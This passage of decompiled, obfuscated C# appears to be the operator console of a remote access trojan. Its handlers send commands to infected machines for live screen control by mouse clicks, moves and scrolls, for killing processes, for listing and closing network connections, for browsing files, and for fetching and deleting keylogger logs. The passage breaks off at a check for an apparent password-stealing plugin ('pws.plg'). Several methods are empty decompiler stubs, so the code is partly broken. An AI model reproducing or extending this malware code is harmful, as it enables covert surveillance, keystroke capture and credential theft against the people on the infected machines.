                        if (Enumerable.ElementAtOrDefault<WaveFormat>(this.concurrentStack_2, index).get_SampleRate() != Enumerable.ElementAtOrDefault<WaveFormat>(this.concurrentStack_2, (int) num3).get_SampleRate())
                        {
                            Interaction.MsgBox("Mixed sample rates not supported.\r\nPlease, select matching sample rates.", MsgBoxStyle.Exclamation, Application.ProductName);
                            return;
                        }
                        Enumerable.ElementAtOrDefault<RawSourceWaveStream>(this.concurrentStack_1, index).set_Position(0L);
                        Enumerable.ElementAtOrDefault<RawSourceWaveStream>(this.concurrentStack_1, index).Read(buffer, 0, (int) Enumerable.ElementAtOrDefault<RawSourceWaveStream>(this.concurrentStack_1, index).get_Length());
                        stream.Write(buffer, 0, buffer.Length);
                    }
                    index++;
                }
                break;
            }
        }
    }

    public byte[] method_108(ref MemoryStream memoryStream_0)
    {
        MemoryStream stream = new MemoryStream();
        WaveFileReader reader = new WaveFileReader(memoryStream_0);
        reader.CopyTo(new LameMP3FileWriter(stream, reader.get_WaveFormat(), 0x80, null));
        reader.Flush();
        reader.Close();
        return stream.ToArray();
    }

    private void method_109(object sender, EventArgs e)
    {
        long num;
        this.vmethod_310().Text = "Samples: " + Conversions.ToString(this.vmethod_316().Items.Count);
        GClass7 class2 = this.vmethod_316();
        if (class2.Items.Count > 0)
        {
            int num2 = class2.Items.Count - 1;
            for (int i = 0; i <= num2; i++)
            {
                if (class2.Items[i].Selected)
                {
                    num += 1L;
                }
            }
        }
        class2 = null;
        this.vmethod_312().Text = "Selected: " + Conversions.ToString(num);
        if (Strings.Len(this.vmethod_342().Tag) > 0)
        {
            this.vmethod_314().Text = "Duration: " + Class136.smethod_35((long) Math.Round((double) ((Class136.smethod_36() - Conversion.Val(this.vmethod_342().Tag)) / 1000.0)), true);
        }
        else
        {
            this.vmethod_314().Text = "Duration: N/A";
        }
    }

    public void method_11(ref long long_1)
    {
        // Unresolved stack state at '0000000D'
    }

    private void method_110(object sender, EventArgs e)
    {
    }

    private void method_111(object sender, MouseEventArgs e)
    {
        if (this.vmethod_94().Checked)
        {
            Class136.Class138 class2;
            if (e.Button == MouseButtons.Left)
            {
                string[] textArray1 = new string[0x10];
                textArray1[0] = "screenlive_click|";
                textArray1[1] = Conversions.ToString(2);
                textArray1[2] = ",";
                textArray1[3] = Conversions.ToString(this.vmethod_24().Bounds.Width);
                textArray1[4] = ",";
                textArray1[5] = Conversions.ToString(this.vmethod_24().Bounds.Height);
                textArray1[6] = ",";
                textArray1[7] = Conversions.ToString(e.X);
                textArray1[8] = ",";
                textArray1[9] = Conversions.ToString(e.Y);
                textArray1[10] = ",";
                textArray1[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_0);
                textArray1[12] = ",";
                textArray1[13] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_1);
                textArray1[14] = ",";
                textArray1[15] = Conversions.ToString(this.vmethod_88().SelectedIndex);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray1);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            if (e.Button == MouseButtons.Right)
            {
                string[] textArray2 = new string[0x10];
                textArray2[0] = "screenlive_click|";
                textArray2[1] = Conversions.ToString(8);
                textArray2[2] = ",";
                textArray2[3] = Conversions.ToString(this.vmethod_24().Bounds.Width);
                textArray2[4] = ",";
                textArray2[5] = Conversions.ToString(this.vmethod_24().Bounds.Height);
                textArray2[6] = ",";
                textArray2[7] = Conversions.ToString(e.X);
                textArray2[8] = ",";
                textArray2[9] = Conversions.ToString(e.Y);
                textArray2[10] = ",";
                textArray2[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_0);
                textArray2[12] = ",";
                textArray2[13] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_1);
                textArray2[14] = ",";
                textArray2[15] = Conversions.ToString(this.vmethod_88().SelectedIndex);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray2);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            if (e.Button == MouseButtons.Middle)
            {
                string[] textArray3 = new string[0x10];
                textArray3[0] = "screenlive_click|";
                textArray3[1] = Conversions.ToString(0x20);
                textArray3[2] = ",";
                textArray3[3] = Conversions.ToString(this.vmethod_24().Bounds.Width);
                textArray3[4] = ",";
                textArray3[5] = Conversions.ToString(this.vmethod_24().Bounds.Height);
                textArray3[6] = ",";
                textArray3[7] = Conversions.ToString(e.X);
                textArray3[8] = ",";
                textArray3[9] = Conversions.ToString(e.Y);
                textArray3[10] = ",";
                textArray3[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_0);
                textArray3[12] = ",";
                textArray3[13] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_1);
                textArray3[14] = ",";
                textArray3[15] = Conversions.ToString(this.vmethod_88().SelectedIndex);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray3);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
    }

    private void method_112(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 8;
        this.method_41();
    }

    private void method_113(object sender, MouseEventArgs e)
    {
        if (this.vmethod_94().Checked)
        {
            Class136.Class138 class2;
            if (e.Button == MouseButtons.Left)
            {
                string[] textArray1 = new string[0x10];
                textArray1[0] = "screenlive_click|";
                textArray1[1] = Conversions.ToString(4);
                textArray1[2] = ",";
                textArray1[3] = Conversions.ToString(this.vmethod_24().Bounds.Width);
                textArray1[4] = ",";
                textArray1[5] = Conversions.ToString(this.vmethod_24().Bounds.Height);
                textArray1[6] = ",";
                textArray1[7] = Conversions.ToString(e.X);
                textArray1[8] = ",";
                textArray1[9] = Conversions.ToString(e.Y);
                textArray1[10] = ",";
                textArray1[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_0);
                textArray1[12] = ",";
                textArray1[13] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_1);
                textArray1[14] = ",";
                textArray1[15] = Conversions.ToString(this.vmethod_88().SelectedIndex);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray1);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            if (e.Button == MouseButtons.Right)
            {
                string[] textArray2 = new string[0x10];
                textArray2[0] = "screenlive_click|";
                textArray2[1] = Conversions.ToString(0x10);
                textArray2[2] = ",";
                textArray2[3] = Conversions.ToString(this.vmethod_24().Bounds.Width);
                textArray2[4] = ",";
                textArray2[5] = Conversions.ToString(this.vmethod_24().Bounds.Height);
                textArray2[6] = ",";
                textArray2[7] = Conversions.ToString(e.X);
                textArray2[8] = ",";
                textArray2[9] = Conversions.ToString(e.Y);
                textArray2[10] = ",";
                textArray2[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_0);
                textArray2[12] = ",";
                textArray2[13] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_1);
                textArray2[14] = ",";
                textArray2[15] = Conversions.ToString(this.vmethod_88().SelectedIndex);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray2);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
            if (e.Button == MouseButtons.Middle)
            {
                string[] textArray3 = new string[0x10];
                textArray3[0] = "screenlive_click|";
                textArray3[1] = Conversions.ToString(0x40);
                textArray3[2] = ",";
                textArray3[3] = Conversions.ToString(this.vmethod_24().Bounds.Width);
                textArray3[4] = ",";
                textArray3[5] = Conversions.ToString(this.vmethod_24().Bounds.Height);
                textArray3[6] = ",";
                textArray3[7] = Conversions.ToString(e.X);
                textArray3[8] = ",";
                textArray3[9] = Conversions.ToString(e.Y);
                textArray3[10] = ",";
                textArray3[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_0);
                textArray3[12] = ",";
                textArray3[13] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_1);
                textArray3[14] = ",";
                textArray3[15] = Conversions.ToString(this.vmethod_88().SelectedIndex);
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray3);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
            }
        }
    }

    private void method_114(object sender, MouseEventArgs e)
    {
        if ((this.vmethod_292().Checked & (Operators.CompareString(this.vmethod_686().Text, "Stop", true) == 0)) && ((e.X != this.int_1) | (this.int_2 != e.Y)))
        {
            Class136.Struct27 struct2 = new Class136.Struct27();
            struct2.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
            bool flag = false;
            if (Class136.GetVersionExA(ref struct2) && (struct2.int_1 >= 6))
            {
                flag = true;
            }
            long num = !flag ? ((long) Class136.GetTickCount()) : Class136.GetTickCount64();
            if ((num - Conversion.Val(this.vmethod_24().Tag)) >= 50.0)
            {
                string[] textArray1 = new string[14];
                textArray1[0] = "screenlive_move|";
                textArray1[1] = Conversions.ToString(this.vmethod_24().Bounds.Width);
                textArray1[2] = ",";
                textArray1[3] = Conversions.ToString(this.vmethod_24().Bounds.Height);
                textArray1[4] = ",";
                textArray1[5] = Conversions.ToString(e.X);
                textArray1[6] = ",";
                textArray1[7] = Conversions.ToString(e.Y);
                textArray1[8] = ",";
                textArray1[9] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_0);
                textArray1[10] = ",";
                textArray1[11] = Conversions.ToString(Enumerable.ElementAtOrDefault<Class130.Struct19>(this.concurrentStack_0, this.vmethod_88().SelectedIndex).long_1);
                textArray1[12] = ",";
                textArray1[13] = Conversions.ToString(this.vmethod_88().SelectedIndex);
                Class136.Class138 class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = string.Concat(textArray1);
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
                PictureBox box = this.vmethod_24();
                struct2 = new Class136.Struct27();
                struct2.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
                flag = false;
                if (Class136.GetVersionExA(ref struct2) && (struct2.int_1 >= 6))
                {
                    flag = true;
                }
                num = !flag ? ((long) Class136.GetTickCount()) : Class136.GetTickCount64();
                box.Tag = num;
            }
            this.int_1 = e.X;
            this.int_2 = e.Y;
        }
    }

    private void method_115(object sender, MouseEventArgs e)
    {
        if (this.vmethod_94().Checked)
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "screenlive_scroll|" + Conversions.ToString(e.Delta);
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    public void method_116(RawSourceWaveStream rawSourceWaveStream_0)
    {
        rawSourceWaveStream_0.set_Position(0L);
        WaveOutEvent event1 = new WaveOutEvent();
        event1.Init(rawSourceWaveStream_0);
        event1.Play();
    }

    private void method_117(object sender, EventArgs e)
    {
        this.vmethod_512().SendToBack();
        this.vmethod_18().SelectedIndex = 9;
        this.method_41();
    }

    private void method_118(object sender, EventArgs e)
    {
        this.vmethod_718().Enabled = false;
        this.vmethod_718().Items.Clear();
        this.vmethod_512().BringToFront();
        this.vmethod_512().Visible = true;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "con_list|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_119(object sender, EventArgs e)
    {
        GClass7 class2 = this.vmethod_718();
        int num = class2.Items.Count - 1;
        for (int i = 0; i <= num; i++)
        {
            if (class2.Items[i].Selected)
            {
                Class136.Class138 class3 = new Class136.Class138();
                class3.string_0 = this.string_4;
                class3.string_1 = Conversions.ToString(Operators.ConcatenateObject("con_close|", class2.Items[i].Tag));
                class3.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                {
                    new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                }
            }
        }
        class2 = null;
    }

    public void method_12(ref string string_12)
    {
        ImageList list1 = new ImageList();
        list1.ImageSize = new Size(0x10, 0x10);
        ImageList list2 = list1;
        string key = string.Empty;
        string left = string.Empty;
        string text = string.Empty;
        string str6 = string.Empty;
        string str7 = string.Empty;
        string str8 = string.Empty;
        string s = string.Empty;
        string str3 = string.Empty;
        if (this.vmethod_720().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_720().Invoke(new Delegate9(this.method_12), args);
            return;
        }
        this.vmethod_474().SendToBack();
        this.vmethod_474().Visible = false;
        this.vmethod_446().Enabled = false;
        this.vmethod_448().Enabled = false;
        this.vmethod_450().Enabled = false;
        this.vmethod_696().Enabled = false;
        this.vmethod_696().Enabled = false;
        this.vmethod_696().Enabled = false;
        this.vmethod_452().Enabled = false;
        this.vmethod_454().Enabled = false;
        this.vmethod_76().Enabled = false;
        this.vmethod_76().Update();
        this.vmethod_720().Update();
        this.vmethod_76().Items.Clear();
        this.vmethod_720().Items.Clear();
        if (this.vmethod_812().Checked)
        {
            this.vmethod_720().LargeImageList = this.imageList_2;
        }
        else
        {
            this.vmethod_720().SmallImageList = list2;
        }
        this.vmethod_76().SmallImageList = list2;
        this.vmethod_472().set_MaximumValue(1);
        this.vmethod_472().Visible = true;
        this.vmethod_408().Maximum = 1;
        List<JToken> list = Enumerable.ToList<JToken>(JObject.Parse(string_12.Substring(7, string_12.Length - 8))["block"]);
        if (list.Count == 2)
        {
            List<JToken>.Enumerator enumerator = list.GetEnumerator();
            if (enumerator.MoveNext())
            {
                JToken current = enumerator.Current;
                this.vmethod_398().Text = "Path: N/A";
                this.vmethod_720().Items.Clear();
                this.vmethod_76().Items.Clear();
                this.vmethod_472().Visible = false;
                this.vmethod_696().Enabled = true;
                this.vmethod_454().Enabled = true;
                this.vmethod_400().Text = "Dirs: N/A";
                this.vmethod_402().Text = "Files: N/A";
                this.vmethod_404().Text = "Objects: N/A";
                this.vmethod_406().Text = "Size: N/A";
                Interaction.MsgBox("Error: Windows cannot access the specified device or path. You may not have the appropriate permissions.\r\n\r\nDetails: " + Encoding.UTF8.GetString(Convert.FromBase64String(list[list.Count - 1]["err"].ToString())), MsgBoxStyle.Critical, Application.ProductName);
                goto TR_0006;
            }
        }
        this.vmethod_472().set_MaximumValue(list.Count - 1);
        this.string_8 = Encoding.UTF8.GetString(Convert.FromBase64String(list[list.Count - 1]["dir"].ToString()));
        this.vmethod_404().Text = "Objects: " + list[list.Count - 1]["objects"].ToString();
        this.vmethod_402().Text = "Files: " + list[list.Count - 1]["files"].ToString();
        this.vmethod_400().Text = "Dirs: " + list[list.Count - 1]["dirs"].ToString();
        this.vmethod_406().Text = "Size: " + list[list.Count - 1]["totsize"].ToString();
        this.vmethod_398().Text = "Path: " + this.string_8;
        this.vmethod_472().Visible = true;
        this.vmethod_408().Maximum = this.vmethod_472().get_MaximumValue();
        this.vmethod_472().set_Value(0);
        this.vmethod_408().Value = 0;
        List<ListViewItem> list3 = new List<ListViewItem>();
        List<ListViewItem> list4 = new List<ListViewItem>();
        this.vmethod_720().Items.Clear();
        List<JToken>.Enumerator enumerator2 = list.GetEnumerator();
        while (true)
        {
            if (!enumerator2.MoveNext())
            {
                this.vmethod_720().Items.AddRange(list3.ToArray());
                this.vmethod_76().Items.AddRange(list4.ToArray());
                break;
            }
            JToken current = enumerator2.Current;
            key = Encoding.UTF8.GetString(Convert.FromBase64String(current["name"].ToString()));
            left = current["obj"].ToString();
            text = current["size"].ToString();
            str6 = current["mod"].ToString();
            str7 = current["type"].ToString();
            str8 = current["attr"].ToString();
            s = string.Empty;
            s = current["icon"].ToString();
            Image image = null;
            if (s.Length > 8)
            {
                image = Class136.smethod_18(ref Convert.FromBase64String(s));
                if (this.vmethod_812().Checked)
                {
                    this.imageList_2.Images.Add(key, image);
                }
                list2.Images.Add(key, image);
            }
            ListViewItem item = new ListViewItem();
            ListViewItem item2 = new ListViewItem();
            if (Operators.CompareString(left, "dir", true) == 0)
            {
                if (s.Length <= 8)
                {
                    item2.Text = key;
                }
                else
                {
                    item2.Text = key;
                    item2.ImageKey = key;
                }
                item2.Tag = current["path"].ToString();
                list4.Add(item2);
            }
            else
            {
                if (s.Length <= 0)
                {
                    item.Text = key;
                }
                else
                {
                    item.Text = key;
                    item.ImageKey = key;
                }
                str3 = current["desc"].ToString();
                str3 = Encoding.UTF8.GetString(Convert.FromBase64String(str3));
                item.SubItems.Add(str3);
                item.SubItems.Add(str7);
                item.SubItems.Add(text);
                item.SubItems.Add(str8);
                item.SubItems.Add(str6);
                item.Tag = current["path"].ToString();
                list3.Add(item);
            }
            if (this.vmethod_472().get_Value() < this.vmethod_472().get_MaximumValue())
            {
                ZeroitAnidasoCircleProgress progress;
                (progress = this.vmethod_472()).set_Value(progress.get_Value() + 1);
                this.vmethod_408().Value = this.vmethod_472().get_Value();
            }
            Application.DoEvents();
        }
    TR_0006:
        this.vmethod_472().set_Value(this.vmethod_472().get_MaximumValue());
        this.vmethod_472().Visible = false;
        if (this.string_8.Length >= 3)
        {
            this.vmethod_452().Enabled = true;
        }
        this.vmethod_446().Enabled = Conversions.ToBoolean(Interaction.IIf(this.string_8.Length > 3, true, false));
        if (this.collection_1.Count > 0)
        {
            this.vmethod_448().Enabled = true;
        }
        this.vmethod_450().Enabled = true;
        this.vmethod_452().Enabled = true;
        this.vmethod_696().Enabled = true;
        this.vmethod_454().Enabled = true;
        this.vmethod_76().Enabled = true;
        this.vmethod_720().Enabled = true;
        this.vmethod_408().Value = 0;
    }

    public void method_120(ref bool bool_3)
    {
        // Unresolved stack state at '0000000D'
    }

    public void method_121(ref string string_12)
    {
        if (this.vmethod_352().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_352().Invoke(new Delegate21(this.method_121), args);
        }
        else
        {
            string text = Encoding.UTF8.GetString(Convert.FromBase64String(string_12)).Replace("\x0001", string.Empty).Replace("\x0003", string.Empty);
            this.vmethod_352().AppendText(text);
            this.vmethod_352().SelectionStart = Strings.Len(this.vmethod_352().Text);
            this.vmethod_352().ScrollToCaret();
            this.vmethod_352().ReadOnly = true;
        }
    }

    private void method_122(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        if (this.vmethod_718().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_718();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (builder.Length > 0)
                    {
                        Clipboard.Clear();
                        string text1 = builder.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                if (class2.Items[num].Selected)
                {
                    builder.Append(class2.Items[num].Text);
                    int num4 = class2.Columns.Count - 1;
                    int num2 = 1;
                    while (true)
                    {
                        if (num2 > num4)
                        {
                            builder.Append("\r\n");
                            break;
                        }
                        builder.Append("\t" + class2.Items[num].SubItems[num2].Text);
                        num2++;
                    }
                }
                num++;
            }
        }
    }

    private void method_123(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        if (this.vmethod_718().Items.Count != 0)
        {
            GClass7 class2 = this.vmethod_718();
            int num3 = class2.Items.Count - 1;
            int num = 0;
            while (true)
            {
                if (num > num3)
                {
                    class2 = null;
                    if (builder.Length > 0)
                    {
                        Clipboard.Clear();
                        string text1 = builder.ToString();
                        Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
                    }
                    break;
                }
                builder.Append(class2.Items[num].Text);
                int num4 = class2.Columns.Count - 1;
                int num2 = 1;
                while (true)
                {
                    if (num2 > num4)
                    {
                        builder.Append("\r\n");
                        num++;
                        break;
                    }
                    builder.Append("\t" + class2.Items[num].SubItems[num2].Text);
                    num2++;
                }
            }
        }
    }

    private void method_124(object sender, EventArgs e)
    {
        GClass7 class2 = this.vmethod_718();
        int num = class2.Items.Count - 1;
        for (int i = 0; i <= num; i++)
        {
            if (class2.Items[i].Selected)
            {
                Class136.Class138 class3 = new Class136.Class138();
                class3.string_0 = this.string_4;
                class3.string_1 = "prc_kill|" + class2.Items[i].SubItems[1].Text;
                class3.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
                {
                    new Thread(new ThreadStart(class3._Lambda$__0)).Start();
                }
            }
        }
        class2 = null;
    }

    private void method_125(object sender, MouseEventArgs e)
    {
        if (this.vmethod_718().Items.Count > 0)
        {
            this.vmethod_368().Enabled = Conversions.ToBoolean(Interaction.IIf(Operators.CompareString(this.vmethod_718().SelectedItems[0].SubItems[2].Text, "TCP", true) == 0, true, false));
        }
        this.vmethod_370().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_718().Items.Count > 0, true, false));
        this.vmethod_378().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_718().SelectedItems.Count > 0, true, false));
    }

    private void method_126(object sender, MouseEventArgs e)
    {
        if (this.vmethod_474().Visible | this.vmethod_472().Visible)
        {
            this.vmethod_102().Enabled = false;
        }
        else
        {
            this.vmethod_102().Enabled = true;
            this.vmethod_104().Enabled = Conversions.ToBoolean(Interaction.IIf(this.string_8.Length >= 3, true, false));
            this.vmethod_294().Enabled = Conversions.ToBoolean(Interaction.IIf(this.string_8.Length >= 3, true, false));
            this.vmethod_108().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_720().SelectedItems.Count > 0, true, false));
            this.vmethod_144().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_720().SelectedItems.Count > 0, true, false));
            this.vmethod_172().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_720().SelectedItems.Count > 0, true, false));
        }
    }

    private void method_127(object sender, EventArgs e)
    {
        this.vmethod_444().Text = "Selected: " + Conversions.ToString(this.vmethod_76().SelectedItems.Count);
    }

    private void method_128(object sender, MouseEventArgs e)
    {
        this.vmethod_12().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_552().SelectedItems.Count > 0, true, false));
    }

    private void method_129(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        GClass7 class2 = this.vmethod_720();
        int num3 = class2.Items.Count - 1;
        int num = 0;
        while (num <= num3)
        {
            builder.Append(class2.Items[num].Text);
            int num4 = class2.Columns.Count - 1;
            int num2 = 1;
            while (true)
            {
                if (num2 > num4)
                {
                    builder.Append("\r\n");
                    num++;
                    break;
                }
                builder.Append("\t" + class2.Items[num].SubItems[num2].Text);
                num2++;
            }
        }
        class2 = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    public void method_13(ref string string_12, Color color_0)
    {
        // Unresolved stack state at '0000000D'
    }

    private void method_130(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        GClass7 class2 = this.vmethod_720();
        if (class2.SelectedItems.Count > 0)
        {
            int num3 = class2.Items.Count - 1;
            for (int i = 0; i <= num3; i++)
            {
                if (class2.Items[i].Selected)
                {
                    builder.Append(class2.Items[i].Text);
                    int num4 = class2.Columns.Count - 1;
                    int num2 = 1;
                    while (true)
                    {
                        if (num2 > num4)
                        {
                            builder.Append("\r\n");
                            break;
                        }
                        builder.Append("\t" + class2.Items[i].SubItems[num2].Text);
                        num2++;
                    }
                }
            }
        }
        class2 = null;
        if (builder.Length > 0)
        {
            Clipboard.Clear();
            string text1 = builder.ToString();
            Clipboard.SetText(text1.Remove(text1.LastIndexOf("\r\n")));
        }
    }

    private void method_131(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        GClass7 class2 = this.vmethod_388();
        if (class2.SelectedItems.Count == 1)
        {
            int num = class2.Items.Count - 1;
            for (int i = 0; i <= num; i++)
            {
                if (class2.Items[i].Selected)
                {
                    builder.Append(Operators.ConcatenateObject(class2.Items[i].Tag, "|"));
                }
            }
        }
        else if ((class2.SelectedItems.Count > 1) && (MessageBox.Show("You have selected " + Conversions.ToString(this.vmethod_388().SelectedItems.Count) + " logs.\r\nLogs will be displayed as a single/combined log. Proceed?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk) == DialogResult.Yes))
        {
            int num3 = class2.Items.Count - 1;
            for (int i = 0; i <= num3; i++)
            {
                if (class2.Items[i].Selected)
                {
                    builder.Append(Operators.ConcatenateObject(class2.Items[i].Tag, "|"));
                }
            }
        }
        this.vmethod_556().Visible = true;
        this.vmethod_556().BringToFront();
        this.vmethod_280().Clear();
        this.vmethod_280().Enabled = false;
        this.vmethod_388().Enabled = false;
        this.vmethod_712().Enabled = false;
        this.vmethod_702().Enabled = false;
        this.vmethod_704().Enabled = false;
        this.vmethod_280().Clear();
        this.vmethod_280().Enabled = false;
        Class136.Class138 class3 = new Class136.Class138();
        class3.string_0 = this.string_4;
        class3.string_1 = "klgoff_get|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(builder.ToString()));
        class3.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
        {
            new Thread(new ThreadStart(class3._Lambda$__0)).Start();
        }
        class2 = null;
    }

    private void method_132(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_718().Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_133(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_78().Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_134(object sender, KeyEventArgs e)
    {
        if (e.KeyData == (Keys.Control | Keys.A))
        {
            IEnumerator enumerator = this.vmethod_720().Items.GetEnumerator();
            while (enumerator.MoveNext())
            {
                ((ListViewItem) enumerator.Current).Selected = true;
            }
        }
    }

    private void method_135(object sender, EventArgs e)
    {
        StringBuilder builder = new StringBuilder();
        GClass7 class2 = this.vmethod_388();
        if (class2.SelectedItems.Count != 1)
        {
            if (class2.SelectedItems.Count > 1)
            {
                if (MessageBox.Show("You have selected " + Conversions.ToString(this.vmethod_388().SelectedItems.Count) + " logs.\r\nLogs will be permanently deleted. Proceed?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
                {
                    return;
                }
                else
                {
                    int num = class2.Items.Count - 1;
                    for (int i = 0; i <= num; i++)
                    {
                        if (class2.Items[i].Selected)
                        {
                            builder.Append(Operators.ConcatenateObject(class2.Items[i].Tag, "|"));
                        }
                    }
                }
            }
        }
        else if (MessageBox.Show("Permanently delete selected log?", Application.ProductName, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
        {
            return;
        }
        else
        {
            builder.Append(Operators.ConcatenateObject(class2.SelectedItems[0].Tag, "|"));
        }
        this.vmethod_556().Visible = true;
        this.vmethod_556().BringToFront();
        this.vmethod_280().Clear();
        this.vmethod_280().Enabled = false;
        this.vmethod_388().Enabled = false;
        this.vmethod_712().Enabled = false;
        this.vmethod_702().Enabled = false;
        this.vmethod_704().Enabled = false;
        this.vmethod_280().Clear();
        this.vmethod_280().Enabled = false;
        Class136.Class138 class3 = new Class136.Class138();
        class3.string_0 = this.string_4;
        class3.string_1 = "klgoff_del|" + Convert.ToBase64String(Encoding.UTF8.GetBytes(builder.ToString()));
        class3.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class3.string_0))
        {
            new Thread(new ThreadStart(class3._Lambda$__0)).Start();
        }
        class2 = null;
    }

    private void method_136(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 10;
        this.method_41();
    }

    private void method_137(object sender, EventArgs e)
    {
        if (!File.Exists(Application.StartupPath + @"\data\plugins\pws.plg"))
        {
            Interaction.MsgBox("Plugin not found! Please make sure: " + Application.StartupPath + @"\data\plugins\pws.plg exists.", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
